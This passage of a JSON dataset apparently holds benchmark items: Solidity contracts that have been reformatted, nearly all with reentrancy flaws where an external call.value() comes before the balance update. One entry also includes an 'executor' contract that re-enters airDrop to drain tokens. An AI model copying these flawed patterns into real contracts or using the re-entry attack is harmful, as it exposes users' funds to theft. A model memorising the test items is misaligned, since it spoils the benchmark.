      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract PrivateDeposit {\nmapping (address => uint) public balances;\nuint public MinDeposit = 1 ether;\naddress public owner;\nLog TransferLog;\nmodifier onlyOwner() {\nrequire(tx.origin == owner);\n_;\n}\nfunction PrivateDeposit() {\nowner = msg.sender;\nTransferLog = new Log();\n}\nfunction setLog(address _lib) onlyOwner {\nTransferLog = Log(_lib);\n}\nfunction Deposit()\npublic\npayable {\nif(msg.value >= MinDeposit) {\nbalances[msg.sender]+=msg.value;\nTransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n}\n}\nfunction CashOut(uint _am) {\nif(_am<=balances[msg.sender]) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nTransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n}\n}\n}\nfunction() public payable{}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 80,
        "transformed_lines": 53,
        "original_chars": 1461,
        "transformed_chars": 1040,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_025",
      "transformed_id": "ss_l1_compressed_sn_ds_025",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract W_WALLET {\nfunction Put(uint _unlockTime)\npublic\npayable {\nvar acc = Acc[msg.sender];\nacc.balance += msg.value;\nacc.unlockTime = _unlockTime>now?_unlockTime:now;\nLogFile.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nvar acc = Acc[msg.sender];\nif( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {\nif(msg.sender.call.value(_am)()) {\nacc.balance-=_am;\nLogFile.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nPut(0);\n}\nstruct Holder {\nuint unlockTime;\nuint balance;\n}\nmapping (address => Holder) public Acc;\nLog LogFile;\nuint public MinSum = 1 ether;\nfunction W_WALLET(address log) public{\nLogFile = Log(log);\n}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 78,
        "transformed_lines": 55,
        "original_chars": 1438,
        "transformed_chars": 1028,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_026",
      "transformed_id": "ss_l1_compressed_sn_ds_026",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract ETH_VAULT {\nmapping (address => uint) public balances;\nLog TransferLog;\nuint public MinDeposit = 1 ether;\nfunction ETH_VAULT(address _log)\npublic {\nTransferLog = Log(_log);\n}\nfunction Deposit()\npublic\npayable {\nif(msg.value > MinDeposit) {\nbalances[msg.sender]+=msg.value;\nTransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n}\n}\nfunction CashOut(uint _am)\npublic\npayable {\nif(_am<=balances[msg.sender]) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nTransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n}\n}\n}\nfunction() public payable{}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 14,
        "mode": "compressed",
        "original_lines": 71,
        "transformed_lines": 47,
        "original_chars": 1270,
        "transformed_chars": 895,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_027",
      "transformed_id": "ss_l1_compressed_sn_ds_027",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract X_WALLET {\nfunction Put(uint _unlockTime)\npublic\npayable {\nvar acc = Acc[msg.sender];\nacc.balance += msg.value;\nacc.unlockTime = _unlockTime>now?_unlockTime:now;\nLogFile.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nvar acc = Acc[msg.sender];\nif( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {\nif(msg.sender.call.value(_am)()) {\nacc.balance-=_am;\nLogFile.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nPut(0);\n}\nstruct Holder {\nuint unlockTime;\nuint balance;\n}\nmapping (address => Holder) public Acc;\nLog LogFile;\nuint public MinSum = 1 ether;\nfunction X_WALLET(address log) public{\nLogFile = Log(log);\n}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 78,
        "transformed_lines": 55,
        "original_chars": 1438,
        "transformed_chars": 1028,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_028",
      "transformed_id": "ss_l1_compressed_sn_ds_028",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract ETH_FUND {\nmapping (address => uint) public balances;\nuint public MinDeposit = 1 ether;\nLog TransferLog;\nuint lastBlock;\nfunction ETH_FUND(address _log)\npublic {\nTransferLog = Log(_log);\n}\nfunction Deposit()\npublic\npayable {\nif(msg.value > MinDeposit) {\nbalances[msg.sender]+=msg.value;\nTransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\nlastBlock = block.number;\n}\n}\nfunction CashOut(uint _am)\npublic\npayable {\nif(_am<=balances[msg.sender]&&block.number>lastBlock) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nTransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n}\n}\n}\nfunction() public payable{}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 15,
        "mode": "compressed",
        "original_lines": 74,
        "transformed_lines": 49,
        "original_chars": 1351,
        "transformed_chars": 959,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_029",
      "transformed_id": "ss_l1_compressed_sn_ds_029",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract PENNY_BY_PENNY {\nstruct Holder {\nuint unlockTime;\nuint balance;\n}\nmapping (address => Holder) public Acc;\nuint public MinSum;\nLogFile Log;\nbool intitalized;\nfunction SetMinSum(uint _val)\npublic {\nif(intitalized)throw;\nMinSum = _val;\n}\nfunction SetLogFile(address _log)\npublic {\nif(intitalized)throw;\nLog = LogFile(_log);\n}\nfunction Initialized()\npublic {\nintitalized = true;\n}\nfunction Put(uint _lockTime)\npublic\npayable {\nvar acc = Acc[msg.sender];\nacc.balance += msg.value;\nif(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;\nLog.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nvar acc = Acc[msg.sender];\nif( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {\nif(msg.sender.call.value(_am)()) {\nacc.balance-=_am;\nLog.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nPut(0);\n}\n}\ncontract LogFile {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 17,
        "mode": "compressed",
        "original_lines": 97,
        "transformed_lines": 67,
        "original_chars": 1697,
        "transformed_chars": 1207,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_030",
      "transformed_id": "ss_l1_compressed_sn_ds_030",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract DEP_BANK {\nmapping (address=>uint256) public balances;\nuint public MinSum;\nLogFile Log;\nbool intitalized;\nfunction SetMinSum(uint _val)\npublic {\nif(intitalized)throw;\nMinSum = _val;\n}\nfunction SetLogFile(address _log)\npublic {\nif(intitalized)throw;\nLog = LogFile(_log);\n}\nfunction Initialized()\npublic {\nintitalized = true;\n}\nfunction Deposit()\npublic\npayable {\nbalances[msg.sender]+= msg.value;\nLog.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nif(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nLog.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nDeposit();\n}\n}\ncontract LogFile {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 88,
        "transformed_lines": 60,
        "original_chars": 1482,
        "transformed_chars": 1045,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_031",
      "transformed_id": "ss_l1_compressed_sn_ds_031",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Private_Bank {\nmapping (address => uint) public balances;\nuint public MinDeposit = 1 ether;\nLog TransferLog;\nfunction Private_Bank(address _log) {\nTransferLog = Log(_log);\n}\nfunction Deposit()\npublic\npayable {\nif(msg.value > MinDeposit) {\nbalances[msg.sender]+=msg.value;\nTransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n}\n}\nfunction CashOut(uint _am)\npublic\npayable {\nif(_am<=balances[msg.sender]) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nTransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n}\n}\n}\nfunction() public payable{}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 14,
        "mode": "compressed",
        "original_lines": 70,
        "transformed_lines": 46,
        "original_chars": 1265,
        "transformed_chars": 894,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_032",
      "transformed_id": "ss_l1_compressed_sn_ds_032",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract PrivateBank {\nmapping (address => uint) public balances;\nuint public MinDeposit = 1 ether;\nLog TransferLog;\nfunction PrivateBank(address _lib) {\nTransferLog = Log(_lib);\n}\nfunction Deposit()\npublic\npayable {\nif(msg.value >= MinDeposit) {\nbalances[msg.sender]+=msg.value;\nTransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n}\n}\nfunction CashOut(uint _am) {\nif(_am<=balances[msg.sender]) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nTransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n}\n}\n}\nfunction() public payable{}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 14,
        "mode": "compressed",
        "original_lines": 68,
        "transformed_lines": 44,
        "original_chars": 1241,
        "transformed_chars": 878,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_033",
      "transformed_id": "ss_l1_compressed_sn_ds_033",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract ETH_VAULT {\nmapping (address => uint) public balances;\nuint public MinDeposit = 1 ether;\nLog TransferLog;\nfunction ETH_VAULT(address _log)\npublic {\nTransferLog = Log(_log);\n}\nfunction Deposit()\npublic\npayable {\nif(msg.value > MinDeposit) {\nbalances[msg.sender]+=msg.value;\nTransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n}\n}\nfunction CashOut(uint _am)\npublic\npayable {\nif(_am<=balances[msg.sender]) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nTransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n}\n}\n}\nfunction() public payable{}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 14,
        "mode": "compressed",
        "original_lines": 71,
        "transformed_lines": 47,
        "original_chars": 1270,
        "transformed_chars": 895,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_034",
      "transformed_id": "ss_l1_compressed_sn_ds_034",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract MONEY_BOX {\nstruct Holder {\nuint unlockTime;\nuint balance;\n}\nmapping (address => Holder) public Acc;\nuint public MinSum;\nLog LogFile;\nbool intitalized;\nfunction SetMinSum(uint _val)\npublic {\nif(intitalized)throw;\nMinSum = _val;\n}\nfunction SetLogFile(address _log)\npublic {\nif(intitalized)throw;\nLogFile = Log(_log);\n}\nfunction Initialized()\npublic {\nintitalized = true;\n}\nfunction Put(uint _lockTime)\npublic\npayable {\nvar acc = Acc[msg.sender];\nacc.balance += msg.value;\nif(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;\nLogFile.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nvar acc = Acc[msg.sender];\nif( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {\nif(msg.sender.call.value(_am)()) {\nacc.balance-=_am;\nLogFile.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nPut(0);\n}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 17,
        "mode": "compressed",
        "original_lines": 97,
        "transformed_lines": 67,
        "original_chars": 1696,
        "transformed_chars": 1206,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_035",
      "transformed_id": "ss_l1_compressed_sn_ds_035",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract WALLET {\nfunction Put(uint _unlockTime)\npublic\npayable {\nvar acc = Acc[msg.sender];\nacc.balance += msg.value;\nacc.unlockTime = _unlockTime>now?_unlockTime:now;\nLogFile.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nvar acc = Acc[msg.sender];\nif( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {\nif(msg.sender.call.value(_am)()) {\nacc.balance-=_am;\nLogFile.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nPut(0);\n}\nstruct Holder {\nuint unlockTime;\nuint balance;\n}\nmapping (address => Holder) public Acc;\nLog LogFile;\nuint public MinSum = 1 ether;\nfunction WALLET(address log) public{\nLogFile = Log(log);\n}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 78,
        "transformed_lines": 55,
        "original_chars": 1434,
        "transformed_chars": 1024,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_036",
      "transformed_id": "ss_l1_compressed_sn_ds_036",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract MY_BANK {\nfunction Put(uint _unlockTime)\npublic\npayable {\nvar acc = Acc[msg.sender];\nacc.balance += msg.value;\nacc.unlockTime = _unlockTime>now?_unlockTime:now;\nLogFile.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nvar acc = Acc[msg.sender];\nif( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {\nif(msg.sender.call.value(_am)()) {\nacc.balance-=_am;\nLogFile.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nPut(0);\n}\nstruct Holder {\nuint unlockTime;\nuint balance;\n}\nmapping (address => Holder) public Acc;\nLog LogFile;\nuint public MinSum = 1 ether;\nfunction MY_BANK(address log) public{\nLogFile = Log(log);\n}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 78,
        "transformed_lines": 55,
        "original_chars": 1436,
        "transformed_chars": 1026,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_037",
      "transformed_id": "ss_l1_compressed_sn_ds_037",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract EtherBank{\nmapping (address => uint) userBalances;\nfunction getBalance(address user) constant returns(uint) {\nreturn userBalances[user];\n}\nfunction addToBalance() {\nuserBalances[msg.sender] += msg.value;\n}\nfunction withdrawBalance() {\nuint amountToWithdraw = userBalances[msg.sender];\nif (!(msg.sender.call.value(amountToWithdraw)())) { throw; }\nuserBalances[msg.sender] = 0;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 18,
        "transformed_lines": 15,
        "original_chars": 469,
        "transformed_chars": 412,
        "compression_ratio": 0.88
      },
      "error": null
    },
    {
      "original_id": "sn_ds_038",
      "transformed_id": "ss_l1_compressed_sn_ds_038",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.10;\ncontract EtherStore {\nuint256 public withdrawalLimit = 1 ether;\nmapping(address => uint256) public lastWithdrawTime;\nmapping(address => uint256) public balances;\nfunction depositFunds() public payable {\nbalances[msg.sender] += msg.value;\n}\nfunction withdrawFunds (uint256 _weiToWithdraw) public {\nrequire(balances[msg.sender] >= _weiToWithdraw);\nrequire(_weiToWithdraw <= withdrawalLimit);\nrequire(now >= lastWithdrawTime[msg.sender] + 1 weeks);\nrequire(msg.sender.call.value(_weiToWithdraw)());\nbalances[msg.sender] -= _weiToWithdraw;\nlastWithdrawTime[msg.sender] = now;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 24,
        "transformed_lines": 17,
        "original_chars": 768,
        "transformed_chars": 600,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_ds_039",
      "transformed_id": "ss_l1_compressed_sn_ds_039",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract ModifierBank {\nmapping (address => uint) public tokenBalance;\nstring constant name = \"Nu Token\";\nfunction airDrop() hasNoBalance supportsToken public{\ntokenBalance[msg.sender] += 20;\n}\nmodifier supportsToken() {\nrequire(keccak256(abi.encodePacked(\"Nu Token\")) == Bank(msg.sender).supportsToken());\n_;\n}\nmodifier hasNoBalance {\nrequire(tokenBalance[msg.sender] == 0);\n_;\n}\n}\ncontract Bank{\nfunction supportsToken() external pure returns(bytes32){\nreturn(keccak256(abi.encodePacked(\"Nu Token\")));\n}\n}\ncontract executor {\nbool hasBeenCalled;\nfunction supportsToken() external returns(bytes32){\nif(!hasBeenCalled){\nhasBeenCalled = true;\nModifierBank(msg.sender).airDrop();\n}\nreturn(keccak256(abi.encodePacked(\"Nu Token\")));\n}\nfunction call(address token) public{\nModifierBank(token).airDrop();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 43,
        "transformed_lines": 34,
        "original_chars": 1178,
        "transformed_chars": 827,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_040",
      "transformed_id": "ss_l1_compressed_sn_ds_040",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.18;\ncontract TokenVault {\nmapping(address => uint) public balances;\nfunction donate(address _to) public payable {\nbalances[_to] += msg.value;\n}\nfunction balanceOf(address _who) public view returns (uint balance) {\nreturn balances[_who];\n}\nfunction withdraw(uint _amount) public {\nif(balances[msg.sender] >= _amount) {\nif(msg.sender.call.value(_amount)()) {\n_amount;\n}\nbalances[msg.sender] -= _amount;\n}\n}\nfunction() public payable {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 7,
        "mode": "compressed",
        "original_lines": 26,
        "transformed_lines": 19,
        "original_chars": 552,
        "transformed_chars": 456,
        "compression_ratio": 0.83
      },
      "error": null
    },
    {
      "original_id": "sn_ds_041",
      "transformed_id": "ss_l1_compressed_sn_ds_041",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract BonusVault{\nmapping (address => uint) private userBalances;\nmapping (address => bool) private claimedBonus;\nmapping (address => uint) private rewardsForA;\nfunction withdrawReward(address recipient) public {\nuint amountToWithdraw = rewardsForA[recipient];\nrewardsForA[recipient] = 0;\n(bool success, ) = recipient.call.value(amountToWithdraw)(\"\");\nrequire(success);\n}\nfunction getFirstWithdrawalBonus(address recipient) public {\nrequire(!claimedBonus[recipient]);\nrewardsForA[recipient] += 100;\nwithdrawReward(recipient);\nclaimedBonus[recipient] = true;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 24,
        "transformed_lines": 18,
        "original_chars": 864,
        "transformed_chars": 589,
        "compression_ratio": 0.68
      },
      "error": null
    },
    {
      "original_id": "sn_ds_042",
      "transformed_id": "ss_l1_compressed_sn_ds_042",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract CrossFunctionVault {\nmapping (address => uint) private userBalances;\nfunction transfer(address to, uint amount) {\nif (userBalances[msg.sender] >= amount) {\nuserBalances[to] += amount;\nuserBalances[msg.sender] -= amount;\n}\n}\nfunction withdrawBalance() public {\nuint amountToWithdraw = userBalances[msg.sender];\n(bool success, ) = msg.sender.call.value(amountToWithdraw)(\"\");\nrequire(success);\nuserBalances[msg.sender] = 0;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 21,
        "transformed_lines": 16,
        "original_chars": 587,
        "transformed_chars": 459,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_ds_043",
      "transformed_id": "ss_l1_compressed_sn_ds_043",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract CommunityVault {\nmapping (address => uint) credit;\nuint balance;\nfunction withdrawAll() public {\nuint oCredit = credit[msg.sender];\nif (oCredit > 0) {\nbalance -= oCredit;\nbool callResult = msg.sender.call.value(oCredit)();\nrequire (callResult);\ncredit[msg.sender] = 0;\n}\n}\nfunction deposit() public payable {\ncredit[msg.sender] += msg.value;\nbalance += msg.value;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 4,
        "mode": "compressed",
        "original_lines": 22,
        "transformed_lines": 18,
        "original_chars": 548,
        "transformed_chars": 401,
        "compression_ratio": 0.73
      },
      "error": null
    },
    {
      "original_id": "sn_ds_044",
      "transformed_id": "ss_l1_compressed_sn_ds_044",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.5.0;\ncontract SimpleVault {\nmapping (address => uint) private userBalances;\nfunction withdrawBalance() public {\nuint amountToWithdraw = userBalances[msg.sender];\n(bool success, ) = msg.sender.call.value(amountToWithdraw)(\"\");\nrequire(success);\nuserBalances[msg.sender] = 0;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 4,
        "mode": "compressed",
        "original_lines": 14,
        "transformed_lines": 10,
        "original_chars": 375,
        "transformed_chars": 296,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_ds_045",
      "transformed_id": "ss_l1_compressed_sn_ds_045",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract TokenVault {\nmapping (address => uint) userBalance;\nfunction getBalance(address u) constant returns(uint){\nreturn userBalance[u];\n}\nfunction addToBalance() payable{\nuserBalance[msg.sender] += msg.value;\n}\nfunction withdrawBalance(){\nif( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){\nthrow;\n}\nuserBalance[msg.sender] = 0;\n}\n}",
